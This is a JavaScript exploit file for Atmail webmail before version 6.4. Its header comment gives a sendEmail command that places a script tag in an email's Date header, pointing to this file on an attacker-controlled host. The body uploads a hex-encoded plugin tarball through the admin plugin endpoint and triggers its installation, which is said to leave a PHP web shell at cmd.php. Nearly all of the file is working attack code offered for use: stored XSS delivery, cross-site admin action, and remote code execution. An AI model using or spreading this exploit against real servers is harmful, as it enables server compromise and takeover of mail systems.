/*
Serve this js file with a webserver. Send a crafted malicious email to the target and wait.
From Kali, you can send the malicious email using the following command:

# sendEmail -f attacker@evil.com -t admin@target.com -s 192.168.100.100 -u "Is this you?!" -o tls=no -o message-content-type=html -o message-header='Date: <script src="http://192.168.100.100/atmail-6.4-newPlugin-fileupload.js"></script>' -m "Nah, I was wrong!"

When the victim will read the email, you will find a malicious php file at the following location:

http://ATMAIL_SERVER/cmd.php

Vulnerable software: atmail < 6.4
Tested on: CentOS release 5.6 (Atmail Appliance)
Author: Werebug https://werebug.com
*/

function installPlugin() {
  var url = "/index.php/admin/plugins/preinstall";

  // The plugin has been manually crafted following the documentation here:
  // https://help.atmail.com/hc/en-us/articles/203020804-Creating-Plugins
  var plugin = "\x1f\x8b\x08\x00\xde\x5e\x0b\x5e\x00\x03\xed\x94\x5d\x6b\xdb\x30\x14\x86\x73\xed\x5f\x71\x08\x85\x34\x10\x1c\x3b\x1f\x0e\x2c\x6b\xbb\x90\x75\x30\xe8\xda\xac\x4b\x17\xc6\x36\x8c\x63\xcb\xb1\x41\x96\x8c\x3e\xd6\x86\xd1\xff\x3e\xc9\x4e\xb2\xc1\x96\x96\x41\xd3\x5d\xec\x3c\x17\x11\x92\xde\xa3\x73\xa4\xf7\x38\x0b\x22\xc8\x52\xaf\xba\x8d\x03\xe2\x19\x46\x23\xaf\x1a\x0d\xd5\xd8\xf3\x07\xdb\x79\xb5\xe6\xf7\x03\xaf\x17\x0c\x07\x83\xc0\xac\xfb\xfe\xd0\x0f\x1a\x30\x3c\x64\x51\x5b\xb4\x54\x91\x00\x68\x08\xce\xd5\x43\xba\x6f\x4b\x7e\x27\xd3\xe7\xa8\xe8\x59\x59\x6c\xfc\x9f\x16\xc9\x8c\xea\x55\xce\x0e\xd0\x09\x7f\xe1\xbf\xdf\xeb\xf5\x8d\xff\xfd\x7e\x80\xfe\x3f\x0b\xbf\xfb\x5f\x0f\x6e\x99\x95\x4f\x95\xe3\x11\xff\xfd\xc1\x68\xe7\x7f\x30\xf2\xac\xff\xc3\xfe\xb0\xd7\x00\xef\xa9\x0a\x78\x88\xff\xdc\xff\x97\x67\xc6\x68\xc7\x89\x69\x24\x25\x6c\x9a\x21\xdc\x35\x43\x58\x0f\x40\xee\x14\x61\x89\x84\x89\x2a\xa2\x9c\x86\x53\xce\x94\xe0\x94\x12\xb1\x15\x7c\x77\x00\x4a\xc1\x15\x89\x15\x49\xe0\x28\x2c\xab\xe5\x37\x9a\xd2\xcb\xa8\x20\x00\x70\x02\xad\xdd\xa9\xad\xf1\x1f\xd5\x53\x5e\x94\x11\x5b\x5b\xe9\xa6\x90\x3d\xc2\x89\x56\x19\x17\x8f\xeb\xa6\xbc\x5c\x8b\x7c\x95\x29\x2b\xbd\x35\xd2\x57\xb7\xb5\xde\x8d\x79\xb1\x27\xe6\x46\x50\xab\xce\x94\x2a\xe5\x8b\x6e\xf7\xf1\x80\x4b\xb3\x20\x6d\xc8\x3c\xcb\x25\xd4\x6b\xb0\x78\x7b\x71\x01\x97\x57\x73\xc8\x22\x51\xc0\x9a\x6b\x01\x45\x14\x67\x39\x23\xee\x9e\x63\x3e\x12\x21\x73\xce\xec\x41\xbe\xeb\xb9\xde\x1e\xd9\x3b\x9e\x68\x4a\xac\xca\x1a\xf1\xd0\x43\x56\x97\x0e\xdc\xfe\x1e\xcd\x6b\x22\x63\x91\x97\xaa\xce\xd9\xfc\xc4\x35\xc4\x11\x03\x19\xa5\x84\xae\x21\x67\xe6\xab\xa0\x14\xd4\xcf\x3b\x75\x20\x57\x2d\x09\xd1\x52\x72\xaa\x95\x15\x31\x13\x6a\xef\x97\x6a\x0a\x11\x4b\xcc\x3e\x24\xdc\xbc\x05\xe3\x26\x8c\xad\xdc\xe6\xd8\xb1\xa9\xf5\x92\xe6\x31\xa4\x9a\xc5\x55\x32\x49\x94\x2e\x8f\xdb\x55\xc7\x00\x1c\xa5\x39\x25\xcc\xb6\xc8\x09\x4c\x66\xb3\xf0\xfa\xca\x3c\x9a\x0b\xcd\x6e\xd3\xfe\xc6\x45\x62\xff\x87\x9a\xe3\x5a\x6b\xa6\x66\x66\xcb\xad\xba\x16\x48\x9c\x71\x90\x19\xa1\x34\x24\x77\x24\x3e\xfe\x72\x14\x5e\x9f\xbf\xbf\x39\xff\x30\xff\xdc\x32\xda\xd6\xd7\xf6\x18\xce\x4e\xb7\xd1\xa9\x09\x4c\x79\x49\xd8\xf1\x2e\x69\xc7\xb4\x45\xab\x5d\xef\xa7\xb7\x22\x57\xc4\xec\x75\xb6\x89\xb6\x1b\x31\xe5\xd2\x6e\x54\xf3\x7b\xe7\xde\x71\xce\x4e\x9d\x7f\xfd\xdd\x22\x08\x82\x20\x08\x82\x20\x08\x82\x20\x08\x82\x20\x08\x82\x20\x08\x82\x20\x08\x82\x20\xc8\xaf\xfc\x00\x1d\xb0\x57\x6d\x00\x28\x00\x00";

  // new Uint8Array(Array.from('\x41\xFE\x80').map(x => x.charCodeAt(0))
  // Thanks to: https://stackoverflow.com/a/54866288/1433971
  var body_uint = new Uint8Array(Array.from(plugin).map(x => x.charCodeAt(0)));
  var body_blob = new Blob([body_uint], { type: "application/x-compressed-tar" })
  var fd = new FormData();
  fd.append("newPlugin", body_blob, "CmdPlugin.tgz");

  var xhr = new XMLHttpRequest();
  xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        // To complete installation, we need a GET request to this URL.
        // This url depends on the filename, if you change the filename, you must change this url accordingly.
        var install_url = "/index.php/admin/plugins/add/file/Q21kUGx1Z2luLnRneg==";
        var inst_xhr = new XMLHttpRequest();
        inst_xhr.open("GET", install_url);
        inst_xhr.send();
    }
  }
  xhr.open("POST", url, true);
  xhr.send(fd);
}

installPlugin();
